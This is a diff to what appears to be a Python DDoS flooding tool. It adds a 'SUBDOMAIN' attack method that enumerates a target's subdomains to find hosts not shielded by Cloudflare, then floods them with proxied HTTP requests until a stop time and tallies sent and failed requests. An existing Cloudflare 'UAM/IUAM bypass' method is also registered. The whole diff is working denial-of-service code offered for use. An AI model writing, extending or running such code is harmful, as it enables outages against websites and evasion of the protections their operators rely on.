@@ -18,7 +18,7 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 '''
 
-import time, requests, cloudscraper
+import time, requests, cloudscraper, socket
 
 from src.core import Core
 from src.utils import *
@@ -42,6 +42,81 @@ headers = {
     'Sec-Fetch-User': '?1',
     'TE': 'trailers'
 }
+
+def flood2(attack_id, url, stoptime) -> None:
+
+    unprotected = []
+
+    # TODO: speed this up using threads or multiprocessing
+
+    # check if the target url is actually protected by cloudflare
+    if not Core.cf_check_busy:
+        while not Core.cf_check_done:
+            Core.cf_check_busy = True
+
+            if not utils().is_cloudflare_ip(socket.gethostbyname(urlparse(url).netloc)):
+                # no cloudflare detected, just stop the attack
+                Core.killattack = True
+                return
+
+            # we need to iterate over a subdomain list
+            # and check if the domain exists
+            for subdomain in subdomains:
+                try:
+                    host = f'{subdomain}.{urlparse(url).netloc}'
+                    print(f'--> {host}')
+
+                    if not utils().is_cloudflare_ip(socket.gethostbyname(host)):
+                        print(f'Hit --> {host}')
+                        # subdomain isn't protected by cloudflare!
+                        unprotected.append(host)
+                
+                except Exception: # does not exist
+                    continue
+            
+            Core.cf_check_done = True
+    else:
+        print('other thread is already working')
+        while not Core.cf_check_busy: 
+            # while another thread is still working on hunting for unprotected subdomains
+            # we wait
+
+            time.sleep(0.2)
+            continue
+
+    # check if we have any unprotected subdomains
+    if len(unprotected) == 0:
+        return
+
+    while time.time() < stoptime and not Core.killattack:
+        if not Core.attackrunning:
+            continue
+
+        for hostname in unprotected:
+
+            url = f'http://{hostname}'
+
+            try:
+                Core.session.get(
+                    utils().buildblock(url), 
+                    headers=utils().buildheaders(url),
+                    timeout=(5,0.1), 
+                    allow_redirects=False,
+                    stream=False,
+                    cert=None,
+                    proxies=utils().get_proxy()
+                )
+
+                Core.infodict[attack_id]['req_sent'] += 1
+            except requests.exceptions.ReadTimeout:
+                Core.infodict[attack_id]['req_sent'] += 1
+
+            except Exception:
+                Core.infodict[attack_id]['req_fail'] += 1
+
+            Core.infodict[attack_id]['req_total'] += 1
+
+    Core.threadcount -= 1
 
 def flood(attack_id, url, stoptime) -> None:
 
@@ -85,5 +160,10 @@ Core.methods.update({
     'CLOUDFLARE': {
         'info': 'Cloudflare UAM/IUAM bypass using cloudscraper',
         'func': flood
+    },
+
+    'SUBDOMAIN': {
+        'info': 'A Cloudflare bypass attack, which checks for unprotected subdomains',
+        'func': flood2
     }
 })
